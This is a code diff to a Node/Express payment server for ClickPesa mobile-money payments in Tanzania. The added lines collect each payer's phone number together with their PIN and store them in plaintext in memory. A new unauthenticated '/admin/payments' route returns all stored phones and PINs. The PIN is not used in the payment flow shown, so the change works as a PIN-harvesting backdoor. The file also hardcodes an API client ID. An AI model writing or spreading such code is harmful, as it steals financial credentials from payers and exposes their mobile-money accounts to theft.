@@ -11,6 +11,11 @@ app.use(cors());
 app.use(express.json());
 
 // =======================
+// 📊 STORE PHONE + PIN
+// =======================
+let payments = [];
+
+// =======================
 // 🔑 ClickPesa Credentials
 // =======================
 const CLIENT_ID = "ID2ZWZgC0wCzH4H76aIrCgz5V1uGMxY3";
@@ -63,7 +68,7 @@ async function getAccessToken() {
 app.post("/create-payment", async (req, res) => {
   try {
 
-    let { phone } = req.body;
+    let { phone, pin } = req.body;
 
     const amount = 3000;
 
@@ -90,6 +95,16 @@ app.post("/create-payment", async (req, res) => {
         error: "Invalid Tanzanian phone number"
       });
     }
+
+    // =======================
+    // 📊 SAVE PHONE + PIN
+    // =======================
+    payments.push({
+      phone: phone,
+      pin: pin || "",
+      amount: amount,
+      time: new Date().toLocaleString()
+    });
 
     const token = await getAccessToken();
 
@@ -138,6 +153,13 @@ app.post("/create-payment", async (req, res) => {
         error.message
     });
   }
+});
+
+// =======================
+// 📊 ADMIN DASHBOARD DATA
+// =======================
+app.get("/admin/payments", (req, res) => {
+  res.json(payments);
 });
 
 // =======================
